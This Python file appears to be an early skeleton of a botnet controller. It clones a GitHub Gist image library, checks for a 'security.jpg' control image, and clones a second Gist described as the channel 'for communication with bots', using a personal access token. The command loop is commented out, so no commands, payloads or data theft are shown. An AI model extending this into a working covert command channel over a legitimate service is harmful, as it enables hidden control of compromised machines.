import os
from time import sleep
from git import GithubGistClient
import argparse
import shutil

IMAGES_LIBRARY = '4c7fe7e6d06b0b90ab4848b234209e95'
CONTROL_IMAGE = 'security.jpg'


class Controller:

    def __init__(self, workdir: str, gist: str, token: str) -> None:
        self._workdir = os.path.abspath(workdir)
        self._gist = gist
        self._token = token

    def _setup(self):
        print(f'removing and re-creating workdir {self._workdir}...')
        shutil.rmtree(self._workdir)
        os.makedirs(self._workdir)
        print(f'workdir ready')

        self._lib_dir = os.path.join(self._workdir, 'lib')
        self._comm_dir = os.path.join(self._workdir, 'comm')

        print('downloading images library to...')
        self._lib_client = GithubGistClient(
            gist=IMAGES_LIBRARY,
            repo_dir=self._lib_dir,
        )
        self._lib_client.clone()
        self._lib_images = set(filter(
            lambda f: f.endswith('.png') or f.endswith('.jpg'),
            os.listdir(self._lib_dir),
        ))
        print(f'library contains {len(self._lib_images)} images')
        for img in self._lib_images:
            print(f'  {img}')
        if CONTROL_IMAGE not in self._lib_images:
            raise RuntimeError(f'Control image {CONTROL_IMAGE} is not the library!')

        self._comm_client = GithubGistClient(
            gist=self._gist,
            token=self._token,
            repo_dir=self._comm_dir,
        )
        print(f'cloning the gist from {self._comm_client.get_https_url(with_token=False)} to {self._comm_dir} ...')
        self._comm_client.clone()

        pass

    def run(self):
        self._setup()

        # while True:
        #     print('test')
        #     sleep(5)
        # pass

    pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        'workdir',
        help='work directory where the files and directories created by the controller will be put'
    )
    parser.add_argument('gist', help='ID of the GitHub Gist for communication with bots')
    parser.add_argument('token', help='GitHub Personal access token (classic) with (at least) gist scope')
    args = parser.parse_args()
    controller = Controller(
        workdir=args.workdir,
        gist=args.gist,
        token=args.token
    )
    controller.run()
